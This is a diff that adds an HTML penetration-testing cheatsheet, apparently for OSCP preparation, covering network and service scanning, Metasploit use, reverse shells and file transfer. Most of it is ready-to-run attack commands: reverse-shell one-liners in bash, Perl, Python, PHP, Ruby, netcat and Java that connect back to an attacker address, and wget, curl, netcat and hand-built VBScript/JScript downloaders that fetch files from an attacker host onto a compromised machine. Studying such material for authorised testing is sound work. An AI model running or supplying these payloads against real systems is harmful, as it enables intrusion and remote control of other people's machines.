@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>cheatsheet</title>
+  <style type="text/css">
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <link rel="stylesheet" href="tufte-css/tufte.css" />
+</head>
+<body>
+<h1 id="quick-and-dirty-cheatsheet">Quick and Dirty Cheatsheet</h1>
+<h2 id="nmap">Nmap</h2>
+<h3 id="quick-host-ping">Quick Host ping</h3>
+<pre><code>nmap -sn 10.0.0.0/24</code></pre>
+<h3 id="in-depth-scan">In Depth Scan</h3>
+<pre><code>nmap -A -oA nmap 10.10.10.0</code></pre>
+<pre><code>nmap -sC -sV -o nmap 10.10.10.0</code></pre>
+<h2 id="common-services">Common Services</h2>
+<h3 id="https">HTTP(S)</h3>
+<p>Nikto host scan</p>
+<pre><code>nikto -host 10.0.0.0 -port 80</code></pre>
+<p>Gobuster</p>
+<pre><code>gobuster -u http://10.0.0.0 -w /usr/share/wordlists/dirbuster/directory-list2.3-medium.txt -x html,php,txt -t 50</code></pre>
+<h3 id="smb-samba">SMB / Samba</h3>
+<p>Nmap Scripts</p>
+<pre><code>locate *.nse | grep smb</code></pre>
+<pre><code>nmap -p 139.445 --script=[scriptname] 10.0.0.0</code></pre>
+<p>enum4linux</p>
+<pre><code>enum4linux -a 10.0.0.0</code></pre>
+<h3 id="ftp">FTP</h3>
+<p>Anonymous Login</p>
+<pre><code>username: anonymouse
+password: anything</code></pre>
+<h3 id="ssh">SSH</h3>
+<p>Banner grab</p>
+<pre><code>nc -nv 10.0.0.0 22</code></pre>
+<h2 id="general-exploits">General Exploits</h2>
+<pre><code>searchsploit [search terms]</code></pre>
+<p>Or just google 4head</p>
+<h3 id="metaploit">Metaploit</h3>
+<blockquote>
+<p>One time use on OSCP Unlimited usage of <code>exploit/multi/handler</code> One time use of meterpreter</p>
+</blockquote>
+<pre><code>msf5&gt; search [search terms]
+msf5&gt; use [path/to/exploit]
+msf5&gt; set [exploit option] [option value]
+msf5&gt; run -j</code></pre>
+<p>Post Exploitation</p>
+<pre><code>msf5&gt; use local/multi/recon/local_exploit_suggestor
+msf5&gt; set SESSION [ID]
+msf5&gt; run</code></pre>
+<blockquote>
+<p>Quick Note: <code>windows/meterpreter/reverse_tcp</code> is staged <code>windows/meterpreter_reverse_tcp</code> is stageless</p>
+</blockquote>
+<h2 id="reverse-shells">Reverse Shells</h2>
+<p>These are all super manual, except for when generating with <code>msfvenom</code></p>
+<p>UNIVERSAL</p>
+<pre><code>msfvenom -p [platform]/reverse_shell_tcp -f [format] -o [outputfile]</code></pre>
+<h3 id="linux">Linux</h3>
+<p>Bash</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/[attack ip]/[port] 0&gt;&amp;1</code></pre>
+<p>Perl</p>
+<pre><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre>
+<p>Python</p>
+<pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
+<p>PHP</p>
+<pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
+<p>Ruby</p>
+<pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre>
+<p>Netcat (unsafe install)</p>
+<pre><code>nc -e /bin/sh 10.0.0.1 1234</code></pre>
+<p>Netcat (safe install)</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code></pre>
+<p>Java</p>
+<pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()</code></pre>
+<h3 id="windows">Windows</h3>
+<p>Honestly, just use <code>msfvenom</code></p>
+<ul>
+<li>Try getting nc.exe on the machine
+<ul>
+<li>nc.exe -e cmd.exe [attacker] [port]</li>
+</ul></li>
+<li>asp/aspx shells if the server is running IIS</li>
+<li>Powershell</li>
+</ul>
+<h2 id="file-transfer">File Transfer</h2>
+<h3 id="linux-1">Linux</h3>
+<p>Hosting</p>
+<pre><code>python -m simpleHTTPServer</code></pre>
+<p>Retrieving</p>
+<pre><code>wget [attacker]/[file]
+curl http://[attacker]/[file]</code></pre>
+<h4 id="netcat">Netcat</h4>
+<p>Hosting</p>
+<pre><code>nc -lvnp [port] &lt; [file]</code></pre>
+<p>Retrieving</p>
+<pre><code>nc -nv [attacker] [port] &gt; [file]</code></pre>
+<h3 id="windows-1">Windows</h3>
+<p>Janky vbs script for file download (imitates wget) - builds line by line</p>
+<pre><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
+echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs
+echo Err.Clear &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
+echo http.Open &quot;GET&quot;, strURL, False &gt;&gt; wget.vbs
+echo http.Send &gt;&gt; wget.vbs
+echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs
+echo strData = &quot;&quot; &gt;&gt; wget.vbs
+echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs
+echo Next &gt;&gt; wget.vbs
+echo ts.Close &gt;&gt; wget.vbs</code></pre>
+<p>Run with:</p>
+<pre><code>cscript wget.vbs http://[attacker]/[file] [filename]</code></pre>
+<p>Janky js for file download (manual) - raw</p>
+<pre><code>var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
+WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+
+/* echo WScript.Echo(WinHttpReq.ResponseText); Use for nonbinary files */
+
+BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;);
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+
+/* change file name here /*
+BinStream.SaveToFile(&quot;out.exe&quot;);</code></pre>
+<p>Run with</p>
+<pre><code>cscript /nologo wget.js http://[attacker]/[file]</code></pre>
+</body>
+</html>
